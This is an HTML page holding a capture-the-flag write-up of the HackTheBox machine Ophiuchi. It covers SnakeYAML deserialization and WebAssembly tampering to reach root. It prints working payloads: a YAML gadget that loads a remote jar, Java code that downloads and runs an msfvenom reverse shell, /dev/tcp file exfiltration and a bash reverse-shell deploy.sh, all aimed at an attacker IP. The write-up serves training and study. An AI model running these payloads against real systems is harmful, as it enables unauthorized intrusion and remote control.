<!doctype html><html lang=en dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>HackTheBox - Ophiuchi | Ef's log</title>
<meta name=keywords content="HackTheBox,Writeup,Cyber Security,Pentesting">
<meta name=description content="Deserialization attack on YAML and reversing web assembly">
<meta name=author content="Fahmi FJ">
<link rel=canonical href=https://fahmifj.github.io/writeups/hackthebox/htb-ophiuchi/>
<meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8">
<link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.84dacdb01b1b6f491e8c2232dd12ef8f8ddff6dc8f3f27d004f62d2ae03d9790.css integrity="sha256-hNrNsBsbb0kejCIy3RLvj43f9tyPPyfQBPYtKuA9l5A=" rel="preload stylesheet" as=style>
<script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.741dec98d6b054bccfc6d283634767a9ea1005b131dd1c3bc34014028a2940ba.js integrity="sha256-dB3smNawVLzPxtKDY0dnqeoQBbEx3Rw7w0AUAoopQLo=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://fahmifj.github.io/favicon.ico>
<link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png>
<link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png>
<link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png>
<link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<meta name=generator content="Hugo 0.87.0">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-PDN0GP97D1',{anonymize_ip:!1})}</script>
<meta property="og:title" content="HackTheBox - Ophiuchi">
<meta property="og:description" content="Deserialization attack on YAML and reversing web assembly">
<meta property="og:type" content="article">
<meta property="og:url" content="https://fahmifj.github.io/writeups/hackthebox/htb-ophiuchi/">
<meta property="og:image" content="https://fahmifj.github.io/writeups/hackthebox/htb-ophiuchi/imgs/image-20210806194149187.png"><meta property="article:section" content="writeups">
<meta property="article:published_time" content="2021-08-06T17:52:28+07:00">
<meta property="article:modified_time" content="2021-08-06T17:52:28+07:00">
<meta name=twitter:card content="summary_large_image">
<meta name=twitter:image content="https://fahmifj.github.io/writeups/hackthebox/htb-ophiuchi/imgs/image-20210806194149187.png">
<meta name=twitter:title content="HackTheBox - Ophiuchi">
<meta name=twitter:description content="Deserialization attack on YAML and reversing web assembly">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Write-ups","item":"https://fahmifj.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox","item":"https://fahmifj.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"HackTheBox - Ophiuchi","item":"https://fahmifj.github.io/writeups/hackthebox/htb-ophiuchi/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox - Ophiuchi","name":"HackTheBox - Ophiuchi","description":"Deserialization attack on YAML and reversing web assembly","keywords":["HackTheBox","Writeup","Cyber Security","Pentesting"],"articleBody":"Ophiuchi starts off by enumerating a Java web application that offers a service for parsing YAML. The parser is vulnerable to a deserialization attack. Exploiting the vulnerability results in an interactive shell access to the system. Internal enumeration of the system finds a set of user credentials. This user is allowed to run a specific Go program which loads a web assembly file and executes a script file if a certain condition is met. The program loads these files without their absolute path. As a result, the files could be replaced with malicious ones to gain root access.\nSkills Learned  YAML deserialization attack Web Assembly (WASM) Code Analysis (Go \u0026 WASM) Sudo exploitation  Tools  Nmap Java Compiler Yaml-payload Wabt  Reconnaissance Nmap A full TCP scan using nmap discovers 2 open ports: SSH on port 22 and an Apache Tomcat servlet on port 8080.\n→ root@kali «ophiuchi» «10.10.14.53» $ nmap -p- --reason -oA nmap/10-tcp-allport-ophiuchi 10.10.10.227 Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-17 10:09 EDT Nmap scan report for 10.10.10.227 Host is up, received echo-reply ttl 63 (0.056s latency). Not shown: 65533 closed ports Reason: 65533 resets PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 8080/tcp open http-proxy syn-ack ttl 63 Nmap done: 1 IP address (1 host up) scanned in 77.26 seconds → root@kali «ophiuchi» «10.10.14.53» $ nmap -p22,8080 -sC -sV -oA nmap/10-tcp-allport-scripts-ophiuchi 10.10.10.227 Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-17 10:21 EDT Nmap scan report for 10.10.10.227 Host is up (0.055s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) 8080/tcp open http Apache Tomcat 9.0.38 |_http-title: Parse YAML Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.35 seconds Enumeration TCP 8080 - Website On port 8080, the machine hosts a site that serves a YAML parser service.\n When I submit a sample YAML payload, it returns the following message.\n But, if I send an invalid payload, for example:\ntest: test test: test I get the following results:\n From the error above, I noticed the org.yaml.snake.yaml.load package is being used. This package is typically used for YAML deserialization.\nFoothold Shell as tomcat SnakeYAML Insecure Deserialization - PoC Although the web app said the parser feature is temporarily on hold, I’m sure that each payload I submit is being processed on the backend.\nSearching on Google about the Snake YAML deserialization attack, I came across this post. This is exactly what I need. I took the payload from that post and modified the URL to point to my HTB IP. I will setup a netcat listener and submit the payload to the parser.\n!!javax.script.ScriptEngineManager[!!java.net.URLClassLoader[[!!java.net.URL[\"http://10.10.14.23/iamf\"]]]]On my listener, I get the following request.\n→ kali@kali «ophiuchi» «10.10.14.23» $ nc -nvlp 80 listening on [any] 80 ... connect to [10.10.14.23] from (UNKNOWN) [10.10.10.227] 53002 GET /iamf HTTP/1.1 User-Agent: Java/11.0.8 Host: 10.10.14.23 Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2 Connection: keep-alive  That means the parser is vulnerable to insecure deserialization attack!\nSnakeYAML Insecure Deserialization - Weaponize The researcher on the previous post uses a .jar payload from this Github repo to get a code execution. I will clone that repo to my machine.\n→ kali@kali «exploits» «10.10.14.23» $ git clone https://github.com/artsploit/yaml-payload.git \u0026\u0026 cd yaml-payload Cloning into 'yaml-payload'... remote: Enumerating objects: 10, done. remote: Total 10 (delta 0), reused 0 (delta 0), pack-reused 10 Receiving objects: 100% (10/10), done. From that repo, I will modify the codes of AwesomeScriptEngineFactory.java file to make it executes a sequence OS commands that will grab my malicious binary and execute it afterwards.\npackage artsploit; import javax.script.ScriptEngine; import javax.script.ScriptEngineFactory; import java.io.IOException; import java.util.List; public class AwesomeScriptEngineFactory implements ScriptEngineFactory { public AwesomeScriptEngineFactory() { try { Runtime.getRuntime().exec(\"wget http://10.10.14.23/iamf-shell -O /tmp/iamf-shell;\"); Runtime.getRuntime().exec(\"chmod +x /tmp/iamf-shell\"); Runtime.getRuntime().exec(\"/tmp/iamf-shell\"); } catch (IOException e) { e.printStackTrace(); } } ...[SNIP]... } Next, I will compile the code and pack the whole src/ folder into a java archive (jar) file.\n→ kali@kali «yaml-payload» «10.10.14.23» git:(master) ✗ $ javac src/artsploit/AwesomeScriptEngineFactory.java \u0026\u0026 jar -cvf yaml-payload.jar -C src/ . Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true adding: META-INF/ (in=0) (out=0) (stored 0%) adding: META-INF/MANIFEST.MF (in=56) (out=56) (stored 0%) adding: ./ (in=0) (out=0) (stored 0%) adding: META-INF/ (in=0) (out=0) (stored 0%) adding: META-INF/services/ (in=0) (out=0) (stored 0%) adding: META-INF/services/javax.script.ScriptEngineFactoed -5%) adding: artsploit/ (in=0) (out=0) (stored 0%) adding: artsploit/AwesomeScriptEngineFactory.class (in=1%) adding: artsploit/AwesomeScriptEngineFactory.java~ (in=5) adding: artsploit/AwesomeScriptEngineFactory.java (in=16) Total: ------ (in = 4083) (out = 2846) (deflated 30%) Then I will create my malicious binary using msfvenom. This binary along with the jar will be hosted using a Python web server.\n→ kali@kali «exploits» «10.10.14.23» $ msfvenom -p linux/x64/shell_reverse_tcp lhost=10.10.14.23 lport=53 -f elf -o iamf-shell [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 74 bytes Final size of elf file: 194 bytes Saved as: iamf-shell Finally, I will setup a netcat listener and submit the following payload.\n!!javax.script.ScriptEngineManager[!!java.net.URLClassLoader[[!!java.net.URL[\"http://10.10.14.23/yaml-payload.jar\"]]]]Within a few seconds, I get an interactive shell as tomcat.\n Shell Upgrade As usual, I will do the PTY trick to upgrade my shell.\nwhich script /usr/bin/script script /dev/null -c bash Script started, file is /dev/null tomcat@ophiuchi:/$ export TERM=xterm export TERM=xterm tomcat@ophiuchi:/$ ^Z [2] + 7400 suspended nc -nvlp 53 → kali@kali «exploits» «10.10.14.23» $ stty raw -echo;fg [2] - 7400 continued nc -nvlp 53 tomcat@ophiuchi:/$ stty rows 30 cols 126 Privilege Escalation Shell as admin Enumeration There are only two users in this machine who have login shell: root and admin.\ntomcat@ophiuchi:/opt/tomcat$ cat /etc/passwd | grep sh$ root:x:0:0:root:/root:/bin/bash admin:x:1000:1000:,,,:/home/admin:/bin/bash Using grep to search for a “password” recursively on the tomcat home directory (/opt/tomcat) reveals a set of credentials for user admin.\ntomcat@ophiuchi:/opt/tomcat$ grep -Ri \"password\" ...[SNIP]... conf/tomcat-users.xml:username=\"admin\" password=\"whythereisalimit\" roles=\"manager-gui,admin-gui\"/ ...[SNIP]... SSH - admin The password whythereisalimit works on SSH for user admin.\n→ kali@kali «exploits» «10.10.14.23» $ ssh admin@10.10.10.227 admin@10.10.10.227's password: Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-51-generic x86_64) ...[SNIP]... System load: 0.08 Usage of /: 19.9% of 27.43GB Memory usage: 17% Swap usage: 0% Processes: 214 Users logged in: 0 IPv4 address for ens160: 10.10.10.227 IPv6 address for ens160: dead:beef::250:56ff:feb9:90cf ...[SNIP]... Last login: Mon Jan 11 08:23:12 2021 from 10.10.14.2 admin@ophiuchi:~$ id uid=1000(admin) gid=1000(admin) groups=1000(admin) User flag is done here.\nShell as root Enumeration User admin is allowed to run a Go program as root.\nadmin@ophiuchi:~$ sudo -l Matching Defaults entries for admin on ophiuchi: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User admin may run the following commands on ophiuchi: (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go Source Code Analysis - index.go What index.go does is:\n It reads a web assembly file called main.wasm and creates an instance of that file. It then exports a function called “info” from the instance and executes it. If the results of that function is “1”, it runs the deploy.sh file.  package main import ( \"fmt\" wasm \"github.com/wasmerio/wasmer-go/wasmer\" \"os/exec\" \"log\" ) func main() { bytes, _ := wasm.ReadBytes(\"main.wasm\") instance, _ := wasm.NewInstance(bytes) defer instance.Close() init := instance.Exports[\"info\"] result,_ := init() f := result.String() if (f != \"1\") { fmt.Println(\"Not ready to deploy\") } else { fmt.Println(\"Ready to deploy\") out, err := exec.Command(\"/bin/sh\", \"deploy.sh\").Output() if err != nil { log.Fatal(err) } fmt.Println(string(out)) } } Also, it’s important to note that this index.go loads deploy.sh and main.wasm with relative path. The deploy.sh and main.wasm themself can be found under /opt/wasms-functions directory.\nadmin@ophiuchi:/opt/wasm-functions$ ls -lah total 3.9M drwxr-xr-x 3 root root 4.0K Oct 14 2020 . drwxr-xr-x 5 root root 4.0K Oct 14 2020 .. drwxr-xr-x 2 root root 4.0K Oct 14 2020 backup -rw-r--r-- 1 root root 88 Oct 14 2020 deploy.sh -rwxr-xr-x 1 root root 2.5M Oct 14 2020 index -rw-rw-r-- 1 root root 522 Oct 14 2020 index.go -rwxrwxr-x 1 root root 1.5M Oct 14 2020 main.wasm The deploy.sh contains a to-do note of a lazy admin.\nadmin@ophiuchi:/opt/wasm-functions$ cat deploy.sh #!/bin/bash # ToDo # Create script to automatic deploy our new web at tomcat port 8080 From here, I will exfil the entire /opt/wasm-functions/ to my machine.\nadmin@ophiuchi:/opt$ tar -czvf /tmp/wasm-functions.tar.gz wasm-functions/ wasm-functions/ wasm-functions/index wasm-functions/index.go wasm-functions/deploy.sh wasm-functions/main.wasm wasm-functions/backup/ wasm-functions/backup/index.go wasm-functions/backup/deploy.sh wasm-functions/backup/main.wasm admin@ophiuchi:/opt$ cat /tmp/wasm-functions.tar.gz  /dev/tcp/10.10.14.23/53 On my listener:\n→ kali@kali «exploits» «10.10.14.23» $ nc -nvlp 53  wasm-functions.tar.gz listening on [any] 53 ... connect to [10.10.14.23] from (UNKNOWN) [10.10.10.227] 45380 Reversing main.wasm Now I need to find out the content of main.wasm. Fortunately there is a tool to {de,re}compile a wasm file, called wabt. I will clone the repo and make the tool available to system-wide.\n$ wget https://github.com/WebAssembly/wabt/releases/download/1.0.23/wabt-1.0.23-ubuntu.tar.gz -O /opt/ $ tar -xvf /opt/wabt-1.0.23-ubuntu.tar.gz $ export PATH=\"/opt/wabt-1.0.23/bin\":$PATH I will decompile the main.wasm using wasm-decompile. It shows that the info function has return value of 0.\n→ kali@kali «wasm-functions» «10.10.14.23» $ wasm-decompile main.wasm export memory memory(initial: 16, max: 0); global g_a:int = 1048576; export global data_end:int = 1048576; export global heap_base:int = 1048576; table T_a:funcref(min: 1, max: 1); export function info():int { return 0 } Exploitation Since I need a return value of 1, so that index.go will execute the deploy.sh, I will create my own main.wasm file from the exfiltrated main.wasm using wasm2wat.\n→ kali@kali «exploits» «10.10.14.23» $ wasm2wat ../loot/wasm-functions/main.wasm | tee main.wat (module (type (;0;) (func (result i32))) (func $info (type 0) (result i32) i32.const 0) (table (;0;) 1 1 funcref) (memory (;0;) 16) (global (;0;) (mut i32) (i32.const 1048576)) (global (;1;) i32 (i32.const 1048576)) (global (;2;) i32 (i32.const 1048576)) (export \"memory\" (memory 0)) (export \"info\" (func $info)) (export \"__data_end\" (global 1)) (export \"__heap_base\" (global 2))) Then I will modify the return value of the info function to 1.\n...[SNIP]... (func $info (type 0) (result i32) i32.const 1) ...[SNIP]... I will compile the main.wat back to main.wasm using wat2wasm\n→ kali@kali «exploits» «10.10.14.23» $ wat2wasm main.wat Then I will create my own deploy.sh that contains a reverse shell.\n→ kali@kali «exploits» «10.10.14.23» $ cat deploy.sh #!/bin/sh bash -c \"bash -i \u0026 /dev/tcp/10.10.14.23/53 0\u00261\" I will transfer my main.wasm and deploy.sh using scp to/tmp/.\n→ kali@kali «exploits» «10.10.14.23» $ scp main.wasm deploy.sh admin@10.10.10.227:/tmp admin@10.10.10.227's password: main.wasm 100% 112 1.7KB/s 00:00 deploy.sh 100% 60 1.1KB/s 00:00 Finally, I will setup a netcat listener and run the allowed sudo command on the /tmp/ directory.\nadmin@ophiuchi:/tmp$ sudo /usr/bin/go run /opt/wasm-functions/index.go Now I have a root shell on my listener.\n→ kali@kali «exploits» «10.10.14.23» $ nc -nvlp 53 listening on [any] 53 ... connect to [10.10.14.23] from (UNKNOWN) [10.10.10.227] 45382 root@ophiuchi:/tmp# id id uid=0(root) gid=0(root) groups=0(root) root@ophiuchi:/tmp#   Reference(s)   https://www.baeldung.com/java-snake-yaml\n  https://www.fatalerrors.org/a/analysis-of-the-snakeyaml-deserialization-in-java-security.html\n  https://webassembly.github.io/wabt/\n  ","wordCount":"1732","inLanguage":"en","image":"https://fahmifj.github.io/writeups/hackthebox/htb-ophiuchi/imgs/image-20210806194149187.png","datePublished":"2021-08-06T17:52:28+07:00","dateModified":"2021-08-06T17:52:28+07:00","author":{"@type":"Person","name":"Fahmi FJ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/writeups/hackthebox/htb-ophiuchi/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script>
</head>
<body class=dark id=top>
<script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove('dark')</script>
<noscript>
<style type=text/css>#theme-toggle,.top-link{display:none}</style>
</noscript>
<header class="header sticky">
<nav class=nav>
<div class=menu-wrapper>
<div class=logo>
<a href=https://fahmifj.github.io/ accesskey=h title=友人F>友人F</a>
</span>
</div>
<ul id=menu onscroll=menu_on_scroll()>
<li>
<a href=https://fahmifj.github.io/about/ title=About>About</a>
</li>
<li>
<a href=https://fahmifj.github.io/archives/ title=Archives>Archives</a>
</li>
<li>
<a href=https://fahmifj.github.io/projects/ title=Projects>Projects</a>
</li>
<li>
<a href=https://fahmifj.github.io/search/ title="Search (Alt + /)" accesskey=/>Search</a>
</li>
</ul>
<span class=logo-switches>
<button id=theme-toggle accesskey=t title><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="25" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</button>
</div>
</nav>
</header>
<main class=main>
<article class=post-single>
<header class=post-header>
<h1 class=post-title>
HackTheBox - Ophiuchi
</h1>
<div class=post-description>
Deserialization attack on YAML and reversing web assembly
</div>
<div class=post-meta>
August 6, 2021&nbsp;·&nbsp;9 min&nbsp;·&nbsp;Fahmi FJ
</div>
</header>
<div class=post-content-wrapper><div class=toc>
<div class=inner><ul>
<li>
<a href=#reconnaissance aria-label=Reconnaissance>Reconnaissance</a><ul>
<li>
<a href=#nmap aria-label=Nmap>Nmap</a></li></ul>
</li>
<li>
<a href=#enumeration aria-label=Enumeration>Enumeration</a><ul>
<li>
<a href=#tcp-8080---website aria-label="TCP 8080 - Website">TCP 8080 - Website</a></li></ul>
</li>
<li>
<a href=#foothold aria-label=Foothold>Foothold</a><ul>
<li>
<a href=#shell-as-tomcat aria-label="Shell as tomcat">Shell as tomcat</a></li></ul>
</li>
<li>
<a href=#privilege-escalation aria-label="Privilege Escalation">Privilege Escalation</a><ul>
<li>
<a href=#shell-as-admin aria-label="Shell as admin">Shell as admin</a></li>
<li>
<a href=#shell-as-root aria-label="Shell as root">Shell as root</a></li></ul>
</li>
<li>
<a href=#references aria-label=Reference(s)>Reference(s)</a>
</li>
</ul>
</div>
</details>
</div>
<div class=post-content>
<figure class=entry-cover>
<img loading=lazy srcset="https://fahmifj.github.io/writeups/hackthebox/htb-ophiuchi/imgs/image-20210806194149187_hu93236e65e76f967abfa394bc01a7444b_187450_360x0_resize_box_3.png 360w ,https://fahmifj.github.io/writeups/hackthebox/htb-ophiuchi/imgs/image-20210806194149187_hu93236e65e76f967abfa394bc01a7444b_187450_480x0_resize_box_3.png 480w ,https://fahmifj.github.io/writeups/hackthebox/htb-ophiuchi/imgs/image-20210806194149187_hu93236e65e76f967abfa394bc01a7444b_187450_720x0_resize_box_3.png 720w ,https://fahmifj.github.io/writeups/hackthebox/htb-ophiuchi/imgs/image-20210806194149187.png 733w" sizes="(min-width: 768px) 720px, 100vw" src=https://fahmifj.github.io/writeups/hackthebox/htb-ophiuchi/imgs/image-20210806194149187.png alt width=733 height=467>
</figure><p>Ophiuchi starts off by enumerating a Java web application that offers a service for parsing YAML. The parser is vulnerable to a deserialization attack. Exploiting the vulnerability results in an interactive shell access to the system. Internal enumeration of the system finds a set of user credentials. This user is allowed to run a specific Go program which loads a web assembly file and executes a script file if a certain condition is met. The program loads these files without their absolute path. As a result, the files could be replaced with malicious ones to gain root access.</p>
<h4 id=skills-learned>Skills Learned<a class=anchor aria-hidden=true href=#skills-learned>#</a></h4>
<ul>
<li>YAML deserialization attack</li>
<li>Web Assembly (WASM)</li>
<li>Code Analysis (Go & WASM)</li>
<li>Sudo exploitation</li>
</ul>
<h4 id=tools>Tools<a class=anchor aria-hidden=true href=#tools>#</a></h4>
<ul>
<li>Nmap</li>
<li>Java Compiler</li>
<li><a href=https://github.com/artsploit/yaml-payload>Yaml-payload</a></li>
<li><a href=https://github.com/WebAssembly/wabt>Wabt</a></li>
</ul>
<h2 id=reconnaissance>Reconnaissance<a class=anchor aria-hidden=true href=#reconnaissance>#</a></h2>
<h3 id=nmap>Nmap<a class=anchor aria-hidden=true href=#nmap>#</a></h3>
<p>A full TCP scan using <code>nmap</code> discovers 2 open ports: SSH on port 22 and an Apache Tomcat servlet on port 8080.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ root@kali «ophiuchi» «10.10.14.53» 
$ nmap -p- --reason -oA nmap/10-tcp-allport-ophiuchi 10.10.10.227                                           
Starting Nmap 7.80 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-06-17 10:09 EDT
Nmap scan report <span class=k>for</span> 10.10.10.227
Host is up, received echo-reply ttl <span class=m>63</span> <span class=o>(</span>0.056s latency<span class=o>)</span>.
Not shown: <span class=m>65533</span> closed ports
Reason: <span class=m>65533</span> resets
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl <span class=m>63</span>
8080/tcp open  http-proxy syn-ack ttl <span class=m>63</span>

Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 77.26 seconds

→ root@kali «ophiuchi» «10.10.14.53» 
$ nmap -p22,8080 -sC -sV -oA nmap/10-tcp-allport-scripts-ophiuchi 10.10.10.227
Starting Nmap 7.80 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-06-17 10:21 EDT
Nmap scan report <span class=k>for</span> 10.10.10.227
Host is up <span class=o>(</span>0.055s latency<span class=o>)</span>.

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
8080/tcp open  http    Apache Tomcat 9.0.38
<span class=p>|</span>_http-title: Parse YAML
Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 9.35 seconds
</code></pre></div><h2 id=enumeration>Enumeration<a class=anchor aria-hidden=true href=#enumeration>#</a></h2>
<h3 id=tcp-8080---website>TCP 8080 - Website<a class=anchor aria-hidden=true href=#tcp-8080---website>#</a></h3>
<p>On port 8080, the machine hosts a site that serves a YAML parser service.</p>
<p><div class=img-container><img src=imgs/image-20210617212718924.png alt=image-20210617212718924></div>
</p>
<p>When I submit a sample YAML payload, it returns the following message.</p>
<p><div class=img-container><img src=imgs/image-20210729200644337.png alt=image-20210729200644337></div>
</p>
<p>But, if I send an invalid payload, for example:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text>test: test
  test: test
</code></pre></div><p>I get the following results:</p>
<p><div class=img-container><img src=imgs/image-20210729200616087.png alt=image-20210729200616087></div>
</p>
<p>From the error above, I noticed the <code>org.yaml.snake.yaml.load</code> package is being used. This package is typically used for <a href=https://www.baeldung.com/java-snake-yaml#basic-usage>YAML deserialization</a>.</p>
<h2 id=foothold>Foothold<a class=anchor aria-hidden=true href=#foothold>#</a></h2>
<h3 id=shell-as-tomcat>Shell as tomcat<a class=anchor aria-hidden=true href=#shell-as-tomcat>#</a></h3>
<h4 id=snakeyaml-insecure-deserialization---poc>SnakeYAML Insecure Deserialization - PoC<a class=anchor aria-hidden=true href=#snakeyaml-insecure-deserialization---poc>#</a></h4>
<p>Although the web app said the parser feature is temporarily on hold, I&rsquo;m sure that each payload I submit is being processed on the backend.</p>
<p>Searching on Google about the Snake YAML deserialization attack, I came across <a href=https://www.fatalerrors.org/a/analysis-of-the-snakeyaml-deserialization-in-java-security.html>this post</a>. This is exactly what I need. I took the payload from that post and modified the URL to point to my HTB IP. I will setup a netcat listener and submit the payload to the parser.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-yaml data-lang=yaml><span class=cp>!!javax.script.ScriptEngineManager</span><span class=w> </span><span class=p>[</span><span class=w>
</span><span class=w>  </span><span class=cp>!!java.net.URLClassLoader</span><span class=w> </span><span class=p>[[</span><span class=w>
</span><span class=w>    </span><span class=cp>!!java.net.URL</span><span class=w> </span><span class=p>[</span><span class=s2>&#34;http://10.10.14.23/iamf&#34;</span><span class=p>]</span><span class=w>
</span><span class=w>  </span><span class=p>]]</span><span class=w>
</span><span class=w></span><span class=p>]</span><span class=w>
</span></code></pre></div><p>On my listener, I get the following request.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ kali@kali «ophiuchi» «10.10.14.23» 
$ nc -nvlp <span class=m>80</span>
listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>80</span> ...
connect to <span class=o>[</span>10.10.14.23<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.227<span class=o>]</span> <span class=m>53002</span>
GET /iamf HTTP/1.1
User-Agent: Java/11.0.8
Host: 10.10.14.23
Accept: text/html, image/gif, image/jpeg, *<span class=p>;</span> <span class=nv>q</span><span class=o>=</span>.2, */*<span class=p>;</span> <span class=nv>q</span><span class=o>=</span>.2
Connection: keep-alive
</code></pre></div><p><div class=img-container><img src=imgs/image-20210729202237145.png alt=image-20210729202237145></div>
</p>
<p>That means the parser is vulnerable to insecure deserialization attack!</p>
<h4 id=snakeyaml-insecure-deserialization---weaponize>SnakeYAML Insecure Deserialization - Weaponize<a class=anchor aria-hidden=true href=#snakeyaml-insecure-deserialization---weaponize>#</a></h4>
<p>The researcher on the previous post uses a <code>.jar</code> payload from <a href=https://github.com/artsploit/yaml-payload>this Github repo</a> to get a code execution. I will clone that repo to my machine.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ kali@kali «exploits» «10.10.14.23» 
$ git clone https://github.com/artsploit/yaml-payload.git <span class=o>&amp;&amp;</span> <span class=nb>cd</span> yaml-payload
Cloning into <span class=s1>&#39;yaml-payload&#39;</span>...
remote: Enumerating objects: 10, <span class=k>done</span>.
remote: Total <span class=m>10</span> <span class=o>(</span>delta 0<span class=o>)</span>, reused <span class=m>0</span> <span class=o>(</span>delta 0<span class=o>)</span>, pack-reused <span class=m>10</span>
Receiving objects: 100% <span class=o>(</span>10/10<span class=o>)</span>, <span class=k>done</span>.
</code></pre></div><p>From that repo, I will modify the codes of <code>AwesomeScriptEngineFactory.java</code> file to make it executes a sequence OS commands that will grab my malicious binary and execute it afterwards.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=kn>package</span> <span class=nn>artsploit</span><span class=o>;</span>

<span class=kn>import</span> <span class=nn>javax.script.ScriptEngine</span><span class=o>;</span>
<span class=kn>import</span> <span class=nn>javax.script.ScriptEngineFactory</span><span class=o>;</span>
<span class=kn>import</span> <span class=nn>java.io.IOException</span><span class=o>;</span>
<span class=kn>import</span> <span class=nn>java.util.List</span><span class=o>;</span>

<span class=kd>public</span> <span class=kd>class</span> <span class=nc>AwesomeScriptEngineFactory</span> <span class=kd>implements</span> <span class=n>ScriptEngineFactory</span> <span class=o>{</span>

    <span class=kd>public</span> <span class=nf>AwesomeScriptEngineFactory</span><span class=o>()</span> <span class=o>{</span>
        <span class=k>try</span> <span class=o>{</span>
            <span class=n>Runtime</span><span class=o>.</span><span class=na>getRuntime</span><span class=o>().</span><span class=na>exec</span><span class=o>(</span><span class=s>&#34;wget http://10.10.14.23/iamf-shell -O /tmp/iamf-shell;&#34;</span><span class=o>);</span>
            <span class=n>Runtime</span><span class=o>.</span><span class=na>getRuntime</span><span class=o>().</span><span class=na>exec</span><span class=o>(</span><span class=s>&#34;chmod +x /tmp/iamf-shell&#34;</span><span class=o>);</span>
            <span class=n>Runtime</span><span class=o>.</span><span class=na>getRuntime</span><span class=o>().</span><span class=na>exec</span><span class=o>(</span><span class=s>&#34;/tmp/iamf-shell&#34;</span><span class=o>);</span>
        <span class=o>}</span> <span class=k>catch</span> <span class=o>(</span><span class=n>IOException</span> <span class=n>e</span><span class=o>)</span> <span class=o>{</span>
            <span class=n>e</span><span class=o>.</span><span class=na>printStackTrace</span><span class=o>();</span>
        <span class=o>}</span>
    <span class=o>}</span>
    
<span class=o>...[</span><span class=n>SNIP</span><span class=o>]...</span>
<span class=o>}</span>

</code></pre></div><p>Next, I will compile the code and pack the whole <code>src/</code> folder into a java archive (jar) file.</p>
